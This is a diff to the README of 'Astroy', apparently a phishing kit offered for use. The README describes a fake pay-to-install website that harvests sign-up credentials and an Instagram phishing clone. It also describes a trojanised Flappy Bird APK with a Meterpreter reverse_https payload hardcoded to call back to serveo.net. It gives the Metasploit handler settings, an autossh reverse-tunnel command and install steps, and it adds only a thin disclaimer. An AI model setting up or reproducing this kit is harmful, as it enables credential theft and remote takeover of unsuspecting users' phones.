@@ -18,9 +18,15 @@ I made this as a tool without distribution in mind, and did not think I would co
 
 We live in a generation where, although most people would fall for most get-rich-quick scams, the effort required to social engineer them into actually compromising themselves is tremendous. Astroy sells itself as an ordinary website that pays users to install and use its Android apps - which is obviously untrue. It instead gathers the credentials of anyone who signs up for it, and provides a malicious ``APK`` file (a Flappy Bird game laced with a reverse-https payload) for the unsuspecting user to download. If the user runs the malicious game, the attacker will gain a Meterpreter session, effectively pulling off a successful double penetration (no pun intended).
 
+![](resources/main.png)
+
 The web templates include a normal sign up page, and an Instagram clone. The reason I did not add more popular templates like Facebook and Google is because their designs weren't as appealing as Instagram's. Special shout out to [thelinuxchoice](https://github.com/thelinuxchoice) for the Instagram phishing template - I modified their version a bit, removed their backend and added mine.
 
+![](resources/instagram.png)
+
 The Flappy Bird game is hardcoded with the LHOST ``serveo.net`` and LPORT ``2345``, therefore, anyone can use it with these values. On Metasploit, run ``set lhost localhost`` and ``set lport 2345`` and ``set payload android/meterpreter/reverse_https`` to configure the multi handler. Just make sure you run ``autossh -tt -M 0 -o 'ServerAliveInterval 30' -o 'ServerAliveCountMax 3' -R 2345:localhost:2345 serveo.net`` to forward TCP connections to your machine, and your payload will connect over WAN, only ever disconnecting if you terminate it.
+
+![](resources/metasploit.png)
 
 Astroy only serves as a proof of concept on what black hat hackers can achieve if they get creative. I take no responsibility whatsoever for any usage of the tool for any illegal activities by anyone else.
 
@@ -102,5 +108,17 @@ Running it without any arguments makes the script default to using the default p
 python3 setup.py 80 444 888 999
 ```
 
-This tool assumes the first command line argument will always be ``80``. 
+This tool assumes the first command line argument will always be ``80``. If everything goes well, your screen's output should resemble mine's:
+
+![](resources/setup.png)
+
+Now there should exist a file called ``astroy``, whose path should be ``/usr/bin/astroy``. Run it to start the relevant servers for you, like this:
+
+```sh
+astroy
+```
+
+Your final output should resemble the one below:
+
+![](resources/astroy.png)
 
